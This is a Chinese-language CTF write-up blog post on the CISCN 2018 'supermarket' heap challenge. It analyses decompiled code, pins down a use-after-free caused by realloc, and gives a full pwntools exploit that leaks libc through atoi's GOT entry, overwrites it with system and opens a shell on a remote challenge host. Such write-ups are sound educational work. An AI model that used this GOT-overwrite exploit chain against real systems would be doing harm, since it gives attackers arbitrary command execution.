---
layout: post
title:  supermarket
date:   2021-02-16 00:01:01 +0300
image:  2021-02-16-person.jpg
tags:   [ctf,PWN,ciscn2018,heap,ubuntu16,UAF]
---

checksec

```assembly
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

#### mian()

```assembly
void sub_8048FC1()
{
  while ( 1 )
  {
    menu();
    printf("your choice>> ");
    switch ( sub_804882E() )
    {
      case 1:
        add();
        break;
      case 2:
        del();
        break;
      case 3:
        list();
        break;
      case 4:
        changePrice();
        break;
      case 5:
        changeDescription();
        break;
      case 6:
        exit(0);
        return;
      default:
        puts("invalid choice");
        break;
    }
  }
}
```

#### sub_804882E()

```assembly
int sub_804882E()
{
  char nptr; // [esp+0h] [ebp-28h]

  sub_8048812((int)&nptr, 32);
  return atoi(&nptr);
}
```

#### add()

```assembly
int add()
{
  char *v1; // ebx
  char *v2; // ebx
  char src; // [esp+4h] [ebp-24h]
  int price; // [esp+14h] [ebp-14h]
  int v5; // [esp+18h] [ebp-10h]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 15 && (&s2)[i]; ++i )
    ;
  if ( i > 15 )
    return puts("no more space");
  printf("name:");
  sub_8048812((int)&src, 16);
  v5 = getIndexByName(&src);
  if ( v5 != -1 )
    return puts("name exist");
  v5 = sub_8048D95();
  if ( v5 == -1 )
    return puts("no more space");
  (&s2)[v5] = (char *)malloc(0x1Cu);
  strcpy((&s2)[v5], &src);
  printf("name:%s\n", &src);
  price = 0;
  printf("price:");
  price = sub_804882E();
  printf("price:%d\n", price);
  if ( price > 0 && price <= 999 )
    *((_DWORD *)(&s2)[v5] + 4) = price;
  *((_DWORD *)(&s2)[v5] + 5) = 0;
  while ( *((_DWORD *)(&s2)[v5] + 5) <= 0 || *((_DWORD *)(&s2)[v5] + 5) > 256 )
  {
    printf("descrip_size:");
    v1 = (&s2)[v5];
    *((_DWORD *)v1 + 5) = sub_804882E();
  }
  printf("descrip_size:%d\n", *((_DWORD *)(&s2)[v5] + 5));
  v2 = (&s2)[v5];
  *((_DWORD *)v2 + 6) = malloc(*((_DWORD *)(&s2)[v5] + 5));
  printf("description:");
  return sub_8048812(*((_DWORD *)(&s2)[v5] + 6), *((_DWORD *)(&s2)[v5] + 5));
}
```

每个commodity创建两个堆块，一个commodity结构体，一个description堆块，description堆块的地址保存在commodity结构体中。

#### del()

```assembly
int del()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  v1 = sub_8048DC8();
  if ( v1 == -1 )
    result = puts("not exist");
  else
    result = sub_8048CE0(v1);
  return result;
}
```

#### sub_8048CE0()

```assembly
int __cdecl sub_8048CE0(int a1)
{
  int result; // eax

  if ( (&s2)[a1] )
  {
    *((_DWORD *)(&s2)[a1] + 4) = 0;
    free(*((void **)(&s2)[a1] + 6));
    free((&s2)[a1]);
  }
  result = a1;
  (&s2)[a1] = 0;
  return result;
}
```

先free掉commodity->description堆块，再free掉commodity堆块，而且指针置0，因此不存在UAF漏洞。

#### sub_8048DC8()

```assembly
int sub_8048DC8()
{
  char s1; // [esp+0h] [ebp-28h]

  printf("name:");
  sub_8048812((int)&s1, 32);
  return getIndexByName(&s1);
}
```

#### list()

```assembly
int list()
{
  int v0; // esi
  int v1; // ebx
  char *v2; // edi
  size_t v3; // eax
  int v4; // ebx
  char *v5; // esi
  size_t v6; // eax
  const void *v7; // ebx
  size_t v8; // eax
  size_t v9; // eax
  char s[785]; // [esp+Bh] [ebp-32Dh]
  int i; // [esp+31Ch] [ebp-1Ch]

  memset(s, 0, 0x311u);
  for ( i = 0; i <= 15; ++i )
  {
    if ( (&s2)[i] )
    {
      if ( strlen(*((const char **)(&s2)[i] + 6)) > 0x10 )
      {
        v4 = *((_DWORD *)(&s2)[i] + 4);
        v5 = (&s2)[i];
        v6 = strlen(s);
        sprintf(&s[v6], "%s: price.%d, des.", v5, v4);
        v7 = (const void *)*((_DWORD *)(&s2)[i] + 6);
        v8 = strlen(s);
        memcpy(&s[v8], v7, 0xDu);
        v9 = strlen(s);
        memcpy(&s[v9], "...\n", 4u);
      }
      else
      {
        v0 = *((_DWORD *)(&s2)[i] + 6);
        v1 = *((_DWORD *)(&s2)[i] + 4);
        v2 = (&s2)[i];
        v3 = strlen(s);
        sprintf(&s[v3], "%s: price.%d, des.%s\n", v2, v1, v0);
      }
    }
  }
  puts("all  commodities info list below:");
  return puts(s);
}
```

#### changePrice()

```assembly
signed int changePrice()
{
  signed int result; // eax
  int v1; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  v2 = sub_8048DC8();
  if ( v2 == -1 )
    return puts("not exist");
  if ( *((_DWORD *)(&s2)[v2] + 4) <= 0 || *((_DWORD *)(&s2)[v2] + 4) > 999 )
    return puts("you can't change the price <= 0 or > 999");
  printf("input the value you want to cut or rise in:");
  v1 = sub_804882E();
  if ( v1 < -20 || v1 > 20 )
    return puts("you can't change the price");
  *((_DWORD *)(&s2)[v2] + 4) += v1;
  if ( *((_DWORD *)(&s2)[v2] + 4) <= 0 || (result = *((_DWORD *)(&s2)[v2] + 4), result > 999) )
  {
    puts("bad guy! you destroyed it");
    result = sub_8048CE0(v2);
  }
  return result;
}
```

#### changeDescription()

```assembly
int changeDescription()
{
  int v1; // [esp+8h] [ebp-10h]
  int size; // [esp+Ch] [ebp-Ch]

  v1 = sub_8048DC8();
  if ( v1 == -1 )
    return puts("not exist");
  for ( size = 0; size <= 0 || size > 256; size = sub_804882E() )
    printf("descrip_size:");
  if ( *((_DWORD *)(&s2)[v1] + 5) != size )
    realloc(*((void **)(&s2)[v1] + 6), size);
  printf("description:");
  return sub_8048812(*((_DWORD *)(&s2)[v1] + 6), *((_DWORD *)(&s2)[v1] + 5));
}
```

如果修改的description的size与原来的不同，会使用realloc()函数，重新分配一块空间，但是这里并没有将新分配的空间的地址返回给commodity结构体的description成员。原来的空间自动被free，但是description成员还是指向了原来的内存空间，因此存在UAF漏洞。

#### realloc()

```assembly
extern void *realloc(void *mem_address, unsigned int newsize);
```

mem_address：要改变内存大小的指针名

newsize：新的大小

功能

先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。

如果mem_address为NULL，则realloc()和malloc()类似。分配一个newsize的内存块，返回一个指向该内存块的指针。

如果newsize大小为0，那么释放mem_address指向的内存，并返回NULL。

如果没有足够可用的内存用来完成重新分配（扩大原来的内存块或者分配新的内存块），则返回NULL。而原来的内存块保持不变。

#### exp：

```assembly
# -*-coding:utf-8-*-
from pwn import *

elf = ELF("./supermarket")
libc = ELF("./libc.so.6")

# io = process("./supermarket")
io = remote("111.200.241.244",54448)

def add(name, descrip_size, description):
    io.recvuntil("your choice>> ")
    io.sendline(str(1))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("price:")
    io.sendline("10")
    io.recvuntil("descrip_size:")
    io.sendline(str(descrip_size))
    io.recvuntil("description:")
    io.sendline(description)

def del_(name):
    io.recvuntil("your choice>> ")
    io.sendline(str(2))
    io.recvuntil("name:")
    io.sendline(name)

def list_():
    io.recvuntil("your choice>> ")
    io.sendline(str(3))

def changePrice(name, delta):
    io.recvuntil("your choice>> ")
    io.sendline(str(4))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("input the value you want to cut or rise in:")
    io.sendline(str(delta))

def changeDescription(name, descrip_size, description):
    io.recvuntil("your choice>> ")
    io.sendline(str(5))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("descrip_size:")
    io.sendline(str(descrip_size))
    io.recvuntil("description:")
    io.sendline(description)

add("0", 0x80, "a"*0x10)
add("1", 0x20, "b"*0x10)
# gdb.attach(io)
# raw_input()
'''
0x9ef5000:	0x0000002100000000	0x0000000000000030 commodity0
0x9ef5010:	0x0000000000000000	0x000000800000000a
0x9ef5020:	0x0000008909ef5028	0x6161616161616161 commodity0->description
0x9ef5030:	0x6161616161616161	0x0000000000000000
0x9ef5040:	0x0000000000000000	0x0000000000000000
0x9ef5050:	0x0000000000000000	0x0000000000000000
0x9ef5060:	0x0000000000000000	0x0000000000000000
0x9ef5070:	0x0000000000000000	0x0000000000000000
0x9ef5080:	0x0000000000000000	0x0000000000000000
0x9ef5090:	0x0000000000000000	0x0000000000000000
0x9ef50a0:	0x0000000000000000	0x0000002100000000 commodity1
0x9ef50b0:	0x0000000000000031	0x0000000000000000
0x9ef50c0:	0x000000200000000a	0x0000002909ef50d0 commodity1->description
0x9ef50d0:	0x6262626262626262	0x6262626262626262
0x9ef50e0:	0x0000000000000000	0x0000000000000000
'''

changeDescription("0", 0x90, "")
'''
0x88e4000:	0x0000002100000000	0x0000000000000030 commodity0
0x88e4010:	0x0000000000000000	0x000000800000000a
0x88e4020:	0x00000089088e4028	0xf7f457b0f7f45700 commodity0->description
0x88e4030:	0x6161616161616161	0x0000000000000000
0x88e4040:	0x0000000000000000	0x0000000000000000
0x88e4050:	0x0000000000000000	0x0000000000000000
0x88e4060:	0x0000000000000000	0x0000000000000000
0x88e4070:	0x0000000000000000	0x0000000000000000
0x88e4080:	0x0000000000000000	0x0000000000000000
0x88e4090:	0x0000000000000000	0x0000000000000000
0x88e40a0:	0x0000000000000000	0x0000002000000088 commodity1
0x88e40b0:	0x0000000000000031	0x0000000000000000
0x88e40c0:	0x000000200000000a	0x00000029088e40d0 commodity1->description
0x88e40d0:	0x6262626262626262	0x6262626262626262
0x88e40e0:	0x0000000000000000	0x0000000000000000
0x88e40f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x88e4100:	0x6161616161616161	0x0000000000000000
0x88e4110:	0x0000000000000000	0x0000000000000000
0x88e4120:	0x0000000000000000	0x0000000000000000
0x88e4130:	0x0000000000000000	0x0000000000000000
0x88e4140:	0x0000000000000000	0x0000000000000000
0x88e4150:	0x0000000000000000	0x0000000000000000
0x88e4160:	0x0000000000000000	0x0000000000000000
0x88e4170:	0x0000000000000000	0x0000000000000000
0x88e4180:	0x0000000000000000
'''

add("2", 0x20, "c"*0x10)
'''
0x9e32000:	0x0000002100000000	0x0000000000000030 commodity0
0x9e32010:	0x0000000000000000	0x000000800000000a
0x9e32020:	0x0000002109e32028	0xf7f9c830f7f90032 commodity2                 \ commodity0->description
0x9e32030:	0x6161616161616161	0x000000200000000a                            |
0x9e32040:	0x0000002909e32048	0x6363636363636363 \ commodity2->description  |
0x9e32050:	0x6363636363636363	0x0000000000000000 /                          |
0x9e32060:	0x0000000000000000	0x0000004100000000 \                          |
0x9e32070:	0xf7f9c7b0f7f9c7b0	0x0000000000000000 |                          |
0x9e32080:	0x0000000000000000	0x0000000000000000 |                          |
0x9e32090:	0x0000000000000000	0x0000000000000000 /                          /
0x9e320a0:	0x0000000000000000	0x0000002000000040 commodity1
0x9e320b0:	0x0000000000000031	0x0000000000000000
0x9e320c0:	0x000000200000000a	0x0000002909e320d0 commodity1->description
0x9e320d0:	0x6262626262626262	0x6262626262626262
0x9e320e0:	0x0000000000000000	0x0000000000000000
0x9e320f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x9e32100:	0x6161616161616161	0x0000000000000000
0x9e32110:	0x0000000000000000	0x0000000000000000
0x9e32120:	0x0000000000000000	0x0000000000000000
0x9e32130:	0x0000000000000000	0x0000000000000000
0x9e32140:	0x0000000000000000	0x0000000000000000
0x9e32150:	0x0000000000000000	0x0000000000000000
0x9e32160:	0x0000000000000000	0x0000000000000000
0x9e32170:	0x0000000000000000	0x0000000000000000
0x9e32180:	0x0000000000000000
'''
atoi_got = elf.got["atoi"]
payload = "2".ljust(0x10, "\x00") + p32(20) + p32(0x20) + p32(atoi_got)
# size与创建时的大小一致
changeDescription("0", 0x80, payload)
'''
0x9e32000:	0x0000002100000000	0x0000000000000030 commodity0
0x9e32010:	0x0000000000000000	0x000000800000000a
0x9e32020:	0x0000002109e32028	0x0000000000000032 commodity2                 \ commodity0->description
0x9e32030:	0x0000000000000000	0x0000002000000014                            |
0x9e32040:	0x00000000ATOI_GOT	0x6363636363636363 \ commodity2->description  |
0x9e32050:	0x6363636363636363	0x0000000000000000 /                          |
0x9e32060:	0x0000000000000000	0x0000004100000000 \                          |
0x9e32070:	0xf7f9c7b0f7f9c7b0	0x0000000000000000 |                          |
0x9e32080:	0x0000000000000000	0x0000000000000000 |                          |
0x9e32090:	0x0000000000000000	0x0000000000000000 /                          /
0x9e320a0:	0x0000000000000000	0x0000002000000040 commodity1
0x9e320b0:	0x0000000000000031	0x0000000000000000
0x9e320c0:	0x000000200000000a	0x0000002909e320d0 commodity1->description
0x9e320d0:	0x6262626262626262	0x6262626262626262
0x9e320e0:	0x0000000000000000	0x0000000000000000
0x9e320f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x9e32100:	0x6161616161616161	0x0000000000000000
0x9e32110:	0x0000000000000000	0x0000000000000000
0x9e32120:	0x0000000000000000	0x0000000000000000
0x9e32130:	0x0000000000000000	0x0000000000000000
0x9e32140:	0x0000000000000000	0x0000000000000000
0x9e32150:	0x0000000000000000	0x0000000000000000
0x9e32160:	0x0000000000000000	0x0000000000000000
0x9e32170:	0x0000000000000000	0x0000000000000000
0x9e32180:	0x0000000000000000
'''
list_()

io.recvuntil("price.20, des.")
addr = u32(io.recvuntil("\n")[:-1])
print(hex(addr))

base = addr - libc.symbols["atoi"]
system = base + libc.symbols["system"]

# commodity2->description/atoi_got指向的位置改为system的地址
# 下次调用atoi()时，其实是调用了system()
# size与创建时的大小一致
# !注意，这里的第一个参数name，要与上一个我们自己构造的payload相对应
changeDescription("2", 0x20, p32(system))

# 输出menu后，要求我们输入choice，
# 然后将我们输入的字符串作为了atoi()的参数
# 输入"/bin/sh"触发漏洞

io.recvuntil("your choice>> ")
io.sendline("/bin/sh")

io.interactive()
```

